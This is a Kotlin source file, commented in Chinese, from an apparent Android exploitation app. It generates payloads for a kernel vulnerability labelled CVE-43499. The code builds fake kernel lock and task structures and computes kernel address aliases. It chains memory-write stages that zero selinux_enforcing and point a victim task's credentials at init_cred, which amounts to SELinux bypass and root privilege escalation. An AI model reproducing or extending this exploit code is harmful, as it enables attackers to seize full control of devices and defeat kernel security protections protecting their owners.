package com.ghostlock.app.backend.backends.cve43499.generator

import com.ghostlock.app.backend.backends.cve43499.lifecycle.Cve43499PlacementFacts
import com.ghostlock.app.data.cve43499.A301SoDebugParameters
import com.ghostlock.app.data.cve43499.DebugAddressModel
import com.ghostlock.app.data.cve43499.DebugExecutionParameters
import com.ghostlock.app.data.cve43499.DebugPayloadLayout
import com.ghostlock.app.backend.backends.cve43499.owned.LandingConfig

/**
 * post-placement generator 的具名失败（R3b）。
 *
 * @property reason 稳定可检索的原因（不带 payload 内容、不带 token）。
 * @note Flow 的 `cve43499.page.land` 步骤会把该 reason 前缀成具名失败，
 *   不触 Native、不伪造输入。
 */
internal class Cve43499GeneratorException(
    val reason: String,
    cause: Throwable? = null,
) : IllegalStateException(reason, cause)

/**
 * 小端、带上界的字节写器（generator 内共享）。
 *
 * @param bytes 目标缓冲（长度固定）。
 * @note 越界/负偏移 ⇒ [Cve43499GeneratorException]（fail-closed，绝不静默截断）。
 */
internal class Cve43499LeWriter(private val bytes: ByteArray) {
    /** @return 目标缓冲长度。 */
    val size: Int get() = bytes.size

    /** @return 底层缓冲视图（同一数组；仅供 generator 打包结果）。 */
    fun bytesView(): ByteArray = bytes

    /**
     * 写 16 位小端值。
     *
     * @param offset 字节偏移（≥0）。
     * @param value 值（只用低 16 位）。
     */
    fun putU16(offset: Long, value: Int) {
        requireRange(offset, 2)
        val at = offset.toInt()
        bytes[at] = (value and 0xff).toByte()
        bytes[at + 1] = ((value ushr 8) and 0xff).toByte()
    }

    /**
     * 写 32 位小端值。
     *
     * @param offset 字节偏移（≥0）。
     * @param value 值（只用低 32 位）。
     */
    fun putU32(offset: Long, value: Long) {
        requireRange(offset, 4)
        val at = offset.toInt()
        for (index in 0 until 4) {
            bytes[at + index] = ((value ushr (8 * index)) and 0xffL).toByte()
        }
    }

    /**
     * 写 64 位小端值。
     *
     * @param offset 字节偏移（≥0）。
     * @param value 值。
     */
    fun putU64(offset: Long, value: Long) {
        requireRange(offset, 8)
        val at = offset.toInt()
        for (index in 0 until 8) {
            bytes[at + index] = ((value ushr (8 * index)) and 0xffL).toByte()
        }
    }

    /**
     * 写一整段字节（cred 镜像拷贝用；越界 fail-closed）。
     *
     * @param offset 字节偏移（≥0）。
     * @param source 源字节（只读）。
     */
    fun putBytes(offset: Long, source: ByteArray) {
        requireRange(offset, source.size)
        System.arraycopy(source, 0, bytes, offset.toInt(), source.size)
    }

    /**
     * 读出 64 位小端值（仅供单测/对拍；生产路径不读回）。
     *
     * @param offset 字节偏移（≥0）。
     * @return 64 位值。
     */
    fun getU64(offset: Long): Long {
        requireRange(offset, 8)
        val at = offset.toInt()
        var value = 0L
        for (index in 0 until 8) {
            value = value or ((bytes[at + index].toLong() and 0xffL) shl (8 * index))
        }
        return value
    }

    private fun requireRange(offset: Long, width: Int) {
        if (offset < 0L || offset > size.toLong() - width.toLong()) {
            throw Cve43499GeneratorException("write-out-of-bounds:$offset/$width/$size")
        }
    }
}

/** 写请求的三种模式（数值与 legacy `WriteMode` 对齐：1=Zero，2=Credential）。 */
internal enum class Cve43499WriteMode(val wire: Long) {
    /** 写 0/页派生值（W1/W1b/W3/fast-repair 使用）。 */
    ZERO(1L),

    /** 写凭据指针（W2 使用：value=init_cred data alias，payload 内附 cred 镜像）。 */
    CREDENTIAL(2L),
}

/**
 * 按「写请求」生成 landing + primitive 的 seam（R3d 多写链）。
 *
 * 与 [com.ghostlock.app.backend.backends.cve43499.flow.Cve43499PostPlacementGenerator] 的区别：
 * 后者固定用 W1 请求（`writeRequest()`）；多写链每个阶段（W1b/W2/W3/fast-repair）
 * 都携带自己的 [Cve43499WriteRequest]（target/mode/preserve_child），因此需要把请求
 * 作为参数传入。三路 generator 同时实现两个 seam；实现仍是纯函数。
 *
 * @note 阶段：R3d；不改 Native（请求只是 Kotlin 数据平面输入）。
 */
internal fun interface Cve43499WriteGenerator {
    /**
     * @param facts 本事务 Placement 回传的只读物理事实。
     * @param request 本阶段的写请求（target/mode/preserveChild 全部显式）。
     * @return 本次事务的 landing 输入与 Carrier 描述。
     * @throws Cve43499GeneratorException 事实/配置/请求非法（fail-closed）。
     */
    fun generateForWrite(
        facts: Cve43499PlacementFacts,
        request: Cve43499WriteRequest,
    ): com.ghostlock.app.backend.backends.cve43499.flow.Cve43499GeneratedInputs
}

/**
 * 一次内核写的路由中立输入（legacy2 `memory.h:WriteRequest` 的 Kotlin 形态）。
 *
 * @property target 写入目标的内核地址（data alias）。
 * @property mode 写模式（Zero/Credential）。
 * @property preserveChild true=child 模式（leaf=0；W1），false=leaf 模式（W3）。
 */
internal data class Cve43499WriteRequest(
    val target: Long,
    val mode: Cve43499WriteMode,
    val preserveChild: Boolean,
)

/**
 * 写 payload 的父/值/左右/fops（legacy2 `PayloadWriteLayout` 的 Kotlin 形态）。
 *
 * @property parent 写 relink 的 parent/pc 值（target - pointerBytes）。
 * @property value preserve_child 时携带的写值（W1=pageBase+writeValueOffset）。
 * @property left rb 左子（compact 写路径为 0）。
 * @property fops 默认 fops（仅 Credential 模式使用）。
 * @property needsCredentialCopy 是否需要在 payload 内构造凭据镜像。
 */
internal data class Cve43499WriteLayout(
    val parent: Long,
    val value: Long,
    val left: Long,
    val fops: Long,
    val needsCredentialCopy: Boolean,
)

/**
 * 页接受判据的请求参数（R3a ABI `landing_request.*` 的唯一来源）。
 *
 * @property required 1=启用判据；0=无判据。
 * @property offset 判据值相对 candidatePageBase 的加数（legacy 0x100）。
 * @property bit 判据值必须置位的 bit 下标（legacy selinux initialized=16）。
 */
internal data class Cve43499PageAccept(
    val required: Long,
    val offset: Long,
    val bit: Long,
)

/**
 * landing payload 的构造结果（地址由同一 facts 派生，三路共享）。
 *
 * @property bytes 发送缓冲最终字节（长度=2×allocation）。
 * @property payloadBase 槽位地址基准（非 tcp = base + skbDataDelta）。
 * @property fakeLock 假 lock 内核地址。
 * @property fakeW0 waiter 形状槽内核地址。
 * @property fakeTask 假 task 内核地址。
 * @property writeLayout 写布局（值/父/左右）。
 */
internal data class Cve43499PayloadResult(
    val bytes: ByteArray,
    val payloadBase: Long,
    val fakeLock: Long,
    val fakeW0: Long,
    val fakeTask: Long,
    val writeLayout: Cve43499WriteLayout,
)

/**
 * 三路 generator 的共享上下文：debug 目标事实 + 执行参数 + 本进程 pid。
 *
 * @property debug 已解析的 A301SO debug 参数（含 offset/task_struct/generator 段）。
 * @property execution debug 注入执行参数（Placement/Actor/Landing 与 multicast 执行值）。
 * @property ghostPid multicast D3 disarm 使用的本进程 pid（必须 >0）。
 * @note 不持有 token、不触 Native；generator 是纯函数，可单测。
 * @note 阶段：R3b；真机未验证，不得据此宣称可攻击/supported。
 */
internal data class Cve43499GeneratorContext(
    val debug: A301SoDebugParameters,
    val execution: DebugExecutionParameters,
    val ghostPid: Int,
) {
    /** @return 距离 Image 文本基址 `symbolOffset` 处的 direct-map 别名。 */
    fun dataAlias(symbolOffset: Long): Long =
        com.ghostlock.app.backend.backends.cve43499.generator.dataAlias(
            symbolOffset,
            debug.generator.addressModel,
        )

    /** @return W1 写目标（selinux_enforcing 的 data alias）。 */
    fun writeTarget(): Long = dataAlias(debug.offsets.selinuxEnforcing)

    /** @return `init_cred` 的 data alias（W2 写值 / fast-repair 目标基址）。 */
    fun initCredAlias(): Long = dataAlias(debug.offsets.initCred)

    /**
     * 构造写请求（target/mode/preserve_child 显式给出；不猜 route/阶段语义）。
     *
     * @param target 写目标内核地址（必须非零、由调用方按 legacy 目标派生）。
     * @param mode 写模式（Zero/Credential）。
     * @param preserveChild true=值写（leaf=0；compact waiter 的 value/parent 臂）；
     *   false=零写（leaf=1；`{pc=target-8,0,0}` 臂）。
     * @return 写请求。
     */
    fun writeRequest(
        target: Long = writeTarget(),
        mode: Cve43499WriteMode = Cve43499WriteMode.ZERO,
        preserveChild: Boolean = true,
    ): Cve43499WriteRequest = Cve43499WriteRequest(
        target = target,
        mode = mode,
        preserveChild = preserveChild,
    )

    /**
     * @return W1 写请求（Zero + preserve_child，legacy `run_w1_stage`）。
     */
    fun w1WriteRequest(): Cve43499WriteRequest {
        /* task-119 临时实验键：仅 W1 受影响；其它阶段仍走各自 writeRequest。 */
        val override = debug.generator.writeTargetOverride
        return if (override != null) writeRequest(target = override) else writeRequest()
    }

    /**
     * @param w1PageBase W1 事务的候选页基址（Placement facts）。
     * @return W1b 私有 scratch 修复请求（Zero leaf；target=W1 页基址+buffer_size）。
     * @throws Cve43499GeneratorException 目标派生溢出。
     * @note legacy 参考：退役 `w1_scratch_repair`（`WriteMode::Zero, leaf=1`）。
     */
    fun w1bWriteRequest(w1PageBase: Long): Cve43499WriteRequest = writeRequest(
        target = addExact(w1PageBase, debug.route.bufferSize.toLong(), "w1b:target-overflow"),
        mode = Cve43499WriteMode.ZERO,
        preserveChild = false,
    )

    /**
     * @return fast-repair 写请求（target=init_cred alias+8，Zero leaf）。
     * @note legacy2 `MulticastPolicy::w2_fast_repair_prebuild/activate`：
     *   `WriteRequest::make(data_alias(init_cred_image_addr()) + 8, Zero, 1)`。
     */
    fun fastRepairWriteRequest(): Cve43499WriteRequest = writeRequest(
        target = addExact(initCredAlias(), 8L, "fast-repair:target-overflow"),
        mode = Cve43499WriteMode.ZERO,
        preserveChild = false,
    )

    /**
     * @param victimTaskAddress victim 内核 task_struct 地址（由 target source seam 提供）。
     * @return W2 凭据写请求（Credential + preserve_child；target=task+cred 偏移）。
     */
    fun credentialWriteRequest(victimTaskAddress: Long): Cve43499WriteRequest = writeRequest(
        target = addExact(victimTaskAddress, debug.taskStruct.cred, "w2:target-overflow"),
        mode = Cve43499WriteMode.CREDENTIAL,
        preserveChild = true,
    )

    /**
     * 构造 landing 请求（byte 内容唯一来源；fill/pageAccept 由 generator 派生）。
     *
     * @param bytes 最终发送缓冲字节。
     * @param pageAccept 页接受判据参数。
     * @return LandingConfig（reclaimPayloadSize 为唯一权威=bytes.size）。
     */
    fun landingConfig(bytes: ByteArray, pageAccept: Cve43499PageAccept): LandingConfig =
        LandingConfig(
            finalBytes = bytes,
            contentGeneration = execution.contentGeneration,
            timeoutNanos = execution.timeoutNanos,
            socketSendBufferSize = execution.socketSendBufferSize,
            reclaimSendLimit = execution.reclaimSendLimit,
            reclaimPayloadSize = bytes.size.toLong(),
            fillByte = execution.fillByte,
            pageAcceptRequired = pageAccept.required,
            pageAcceptOffset = pageAccept.offset,
            pageAcceptBit = pageAccept.bit,
        )

    /**
     * 按写请求派生 landing 请求（W1 值写带页接受判据；W1b/W2/W3 无判据）。
     *
     * @param bytes 最终发送缓冲字节。
     * @param request 本事务写请求。
     * @return LandingConfig。
     */
    fun landingConfig(bytes: ByteArray, request: Cve43499WriteRequest): LandingConfig {
        val pageAccept = pageAcceptParameters(
            request = request,
            writeValueOffset = debug.generator.payload.writeValueOffset,
            pageAcceptBit = debug.generator.payload.pageAcceptBit,
        )
        return landingConfig(bytes, pageAccept)
    }
}

/**
 * 计算 image→direct-map 别名（legacy2 `address_math.cpp:data_alias_checked`）。
 *
 * @param symbolOffset 符号相对内核 Image 文本基址的偏移（来自 debug `offset.*`）。
 * @param model 地址模型（direct_map_base / kernel_phys_load / kernel_phys_offset）。
 * @return 直映射地址；以 Long 位模式承载（高位为 1，符号为负）。
 * @throws Cve43499GeneratorException 偏移为负/加法溢出/物理地址低于 DRAM 偏移。
 */
internal fun dataAlias(symbolOffset: Long, model: DebugAddressModel): Long {
    if (symbolOffset < 0L) {
        throw Cve43499GeneratorException("address-model:negative-symbol-offset")
    }
    val load = model.kernelPhysLoad
    val phys = if (load > Long.MAX_VALUE - symbolOffset) {
        throw Cve43499GeneratorException("address-model:phys-overflow")
    } else {
        load + symbolOffset
    }
    if (phys < model.kernelPhysOffset) {
        throw Cve43499GeneratorException("address-model:phys-below-offset")
    }
    val direct = (phys - model.kernelPhysOffset) or model.directMapBase
    if (direct.toULong() < model.directMapBase.toULong()) {
        throw Cve43499GeneratorException("address-model:direct-below-base")
    }
    return direct
}

/**
 * 计算 image 绝对地址（0xffffffc0…）→ direct-map 别名。
 *
 * legacy `ResolvedAddresses::data_alias_checked`（`legacy/memory/address_space.cpp:112-134`）
 * 的 Kotlin 形态：输入是 profile 里的 image 域**绝对地址**（如 cred ref
 * `ref0_image`），先减去 Image 文本基址得到符号偏移，再套 [dataAlias]。
 *
 * @param imageAddress image 域绝对地址（必须 ≥ [imageTextBase]）。
 * @param model 地址模型。
 * @param imageTextBase 内核 Image 文本基址（debug generator 参数；旧 `KIMAGE_TEXT_BASE`）。
 * @return direct-map 别名。
 * @throws Cve43499GeneratorException 基址非法/地址低于基址/加法溢出。
 */
internal fun dataAliasImage(
    imageAddress: Long,
    model: DebugAddressModel,
    imageTextBase: Long,
): Long {
    if (imageTextBase == 0L) {
        throw Cve43499GeneratorException("address-model:image-text-base")
    }
    /* image 域地址是 canonical 负值位模式；数值比较即无符号顺序（两者同域）。 */
    if (imageAddress < imageTextBase) {
        throw Cve43499GeneratorException("address-model:image-below-text-base")
    }
    val symbolOffset = imageAddress - imageTextBase
    if (symbolOffset < 0L) {
        throw Cve43499GeneratorException("address-model:image-offset")
    }
    return dataAlias(symbolOffset, model)
}

/**
 * 解析写布局（legacy2 `memory.cpp:payload_write_layout` 的 Kotlin 形态）。
 *
 * @param request 写请求。
 * @param pageBase 候选页基址（Placement facts）。
 * @param layout payload 布局参数（write_value_offset 从配置来）。
 * @param pointerBytes 内核指针宽度（8）。
 * @param initCredAlias `init_cred` 的 data alias（Credential 模式的写值；Zero 模式可为 0）。
 * @return 写布局。
 * @throws Cve43499GeneratorException 请求/布局非法（fail-closed，不猜）。
 * @note R3d：Credential 模式写值 = `init_cred_alias`（legacy2 `memory.cpp:186-193`）：
 *   `layout.right = init_cred_alias`、`needs_credential_copy=true`；写目标由请求给出。
 */
internal fun writeLayout(
    request: Cve43499WriteRequest,
    pageBase: Long,
    layout: DebugPayloadLayout,
    pointerBytes: Long,
    initCredAlias: Long = 0L,
): Cve43499WriteLayout {
    if (pointerBytes <= 0L || pointerBytes > 8L) {
        throw Cve43499GeneratorException("write-layout:pointer-bytes")
    }
    if (request.target.toULong() < pointerBytes.toULong()) {
        throw Cve43499GeneratorException("write-layout:target-too-small")
    }
    if (request.mode == Cve43499WriteMode.CREDENTIAL) {
        /* W2 值写：value=init_cred 别名 + payload 内 cred 镜像；leaf 语义不适用于
         * Credential（legacy W2 主写 leaf=0 ⇒ preserve_child=true），拒绝不猜。 */
        if (!request.preserveChild) {
            throw Cve43499GeneratorException("write-layout:credential-requires-preserve-child")
        }
        if (initCredAlias == 0L) {
            throw Cve43499GeneratorException("write-layout:credential-init-cred-alias-missing")
        }
        return Cve43499WriteLayout(
            parent = request.target - pointerBytes,
            value = initCredAlias,
            left = 0L,
            fops = 0L,
            needsCredentialCopy = true,
        )
    }
    var value = 0L
    if (request.preserveChild) {
        value = addExact(pageBase, layout.writeValueOffset, "write-layout:value-overflow")
    }
    return Cve43499WriteLayout(
        parent = request.target - pointerBytes,
        value = value,
        left = 0L,
        fops = 0L,
        needsCredentialCopy = false,
    )
}

/**
 * @return 布局是否与请求的 preserve_child 语义一致（legacy `layoutMatchesRequest`）。
 */
internal fun layoutMatchesRequest(
    request: Cve43499WriteRequest,
    layout: Cve43499WriteLayout,
): Boolean = if (request.preserveChild) layout.value != 0L else layout.value == 0L

/**
 * 页接受判据（legacy2 `memory.cpp:payload_write_layout_accepts_page`）。
 *
 * @param request 写请求。
 * @param layout 写布局。
 * @param pageAcceptBit selinux_state.initialized 位下标（debug 配置来）。
 * @return true=该页可安全写入；false=必须拒绝（写该页会清掉 initialized 位）。
 */
internal fun layoutAcceptsPage(
    request: Cve43499WriteRequest,
    layout: Cve43499WriteLayout,
    pageAcceptBit: Long,
): Boolean {
    if (!layoutMatchesRequest(request, layout)) return false
    if (request.mode == Cve43499WriteMode.ZERO && request.preserveChild &&
        ((layout.value ushr pageAcceptBit.toInt()) and 1L) == 0L
    ) {
        return false
    }
    return true
}

/**
 * 由写布局派生 landing_request 的页接受参数（不得使用静态占位）。
 *
 * 判据值 = `candidatePageBase + valueOffset`（legacy `layout.right = page_base + 0x100`）；
 * Native 在提交点前检查该值的 `pageAcceptBit` 位，与 legacy `layoutAcceptsPage` 同义。
 *
 * @param request 写请求。
 * @param writeValueOffset preserve_child 写值相对候选页基址的偏移（旧 0x100）。
 * @param pageAcceptBit 位下标（debug 配置，旧 16）。
 * @return 判据参数；非 W1（零+preserve）时为无判据（required=0）。
 * @throws Cve43499GeneratorException 位域非法。
 */
internal fun pageAcceptParameters(
    request: Cve43499WriteRequest,
    writeValueOffset: Long,
    pageAcceptBit: Long,
): Cve43499PageAccept {
    if (pageAcceptBit !in 0L..63L) {
        throw Cve43499GeneratorException("page-accept:bit-out-of-range")
    }
    val required = if (request.mode == Cve43499WriteMode.ZERO && request.preserveChild) 1L else 0L
    return if (required == 0L) {
        Cve43499PageAccept(required = 0L, offset = 0L, bit = 0L)
    } else {
        Cve43499PageAccept(
            required = 1L,
            offset = writeValueOffset,
            bit = pageAcceptBit,
        )
    }
}

/**
 * 带溢出检查的 64 位加法。
 *
 * @param left 左操作数。
 * @param right 右操作数。
 * @param reason 溢出时的具名 reason。
 * @return 和。
 */
internal fun addExact(left: Long, right: Long, reason: String): Long {
    val result = left + right
    /* 内核地址在 Long 里是负数位模式，用“同号性”判断溢出（与 ULong 等价）。 */
    if (((left xor result) and (right xor result)) < 0L) {
        throw Cve43499GeneratorException(reason)
    }
    return result
}
